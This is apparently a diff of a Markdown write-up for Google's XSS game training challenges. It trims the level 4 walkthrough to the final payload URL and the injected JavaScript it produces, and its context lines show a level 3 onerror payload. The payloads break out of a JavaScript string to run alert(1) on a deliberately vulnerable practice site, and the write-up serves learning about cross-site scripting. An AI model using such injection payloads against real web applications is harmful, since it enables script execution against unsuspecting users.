@@ -33,42 +33,12 @@ https://xss-game.appspot.com/level3/frame#3' onerror='alert(1)';
 ## Level 4
 This is quite tricky. This time I have followed the provided hints. Having the JS console activated and requesting https://xss-game.appspot.com/level4/frame?timer=' showed me following output:
 
-SyntaxError: unterminated string literal
-```
-startTimer(''');
-Obviously there is again a way to escape the function and append the alert() call. I have tried several things:
-
-https://xss-game.appspot.com/level4/frame?timer=');
-```
-```
-   SyntaxError: unterminated string literal
-
-    startTimer('')');
-```
-https://xss-game.appspot.com/level4/frame?timer=');
-```
-      SyntaxError: unterminated string literal
-
-
-    startTimer('')');
- ```
-And then I've decided to use some URL encoding: %3B represents the semi-colon.
-
-https://xss-game.appspot.com/level4/frame?timer=')%3B
-```
-      SyntaxError: unterminated string literal
-
-
-    startTimer('');');
-```
-Aha.. There you go! We can terminate the call and insert other ones. The final request:
 
 https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar b=('
+```
+    startTimer('');alert(1);var b=('');
+```
 
-which resulted in
-
-startTimer('');alert(1);var b=('');
-I must admit: Nice one!
 
 ## Level 5
 This one was quite easy. On the first page you can see a link: https://xss-game.appspot.com/level5/frame/signup?next=confirm. Now let's have a look how this next parameter is used in confirm.html:
